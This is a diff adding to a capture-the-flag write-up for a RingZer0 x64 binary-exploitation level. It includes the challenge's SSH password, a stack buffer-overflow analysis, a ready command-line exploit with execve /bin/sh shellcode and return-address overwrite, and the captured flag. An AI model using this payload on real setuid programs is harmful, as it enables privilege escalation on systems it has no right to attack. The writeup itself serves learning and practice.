@@ -7,7 +7,7 @@ Let's start by logging in the server by typing (_$ is my terminal's prompt_):
 $ ssh x64_user@challenges.ringzer0team.com -p10165  
 ```
 and then type the password in: rztpwnx64
-#### How we can get flag content?
+### How we can get flag content?
 Here's the files in Challenges folder.
 ```
 x64_user@rzt-x64-pwn:/Challenges$ ls -la
@@ -38,7 +38,7 @@ It's important to understand the file permissions of both level1 and level1.flag
 
 >So we (x64_user) will gain privileges as chall1 when level1 is executed =)) we can read the flag level1.flag
 
-#### Examine executable file
+### Examine executable file
 ```
 x64_user@rzt-x64-pwn:/Challenges$ ./level1
 x64_user@rzt-x64-pwn:/Challenges$ ./level1 ok
@@ -93,3 +93,51 @@ Suppose: char *strcpy(char *dest, const char *src);
 =)) Stack illustration:
 
 ![](./stack.png)
+
+So to overwrite `return value` we have to provide exactly (0x400 + 8 bytes (%rbp) + 8 bytes(return value) = ) = 1040 (Bytes) characters
+
+ Note: 8 bytes in %rbp and return value because it compiled in mode 64 bit
+
+### Build argument
+so what should we put in return value? =)) We should put in it another address where our shellcode is at due to the fact that after main function's reaching return or exit it will jump in that address and execute instructions from that point.
+
+Partly due to stack randomization disabled so:
+* return address = address of src
+* put shellcode in src
+
+Finally: the argument has form: "[nop_sled] + [shellcode] + [something] + [address of src] "
+
+#### Get address of src or -0x410(%rbp)
+
+> Note: Different arguments and environment list(means how the program is executed ? in terminal or in gdb) could cause `stack address changing` although `stack randomization disabled`
+
+```
+---- Open gdb and type in commands
+$ b* main + 4
+$ run $(python -c "print 'A'* 1032 + 'B'*8")
+$ print $rbp -0x400
+---- I got $1 = (void *) 0x7f ff ff ff e2 40
+```
+
+#### Get Shellcode
+I has googled and found this: [http://shell-storm.org/shellcode/]
+I chose `Linux/x86-64 - Execute /bin/sh - 27 bytes by Dad`
+
+
+#### Complete argument
+
+$(python -c "print '\x90'* 400 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'A'*(1032 - 27 - 400) + '\x40\xe2\xff\xff\xff\x7f\x00\x00'")
+
+#### Test
+
+When I tested on gdb it only worked partially as the following image:
+
+I'm stuck on why i hasn't gain previlege ??. If you has any answers please tell me @@.
+![](./why.png)
+
+And test from terminal, segmentation fault occured (see note above to see why)
+
+=)) Plus (Minus) 400 several times to return address will work.
+
+### Flag
+`FLAG-7I4rMu7UNA8663700Dgi3a19c3892u6k`
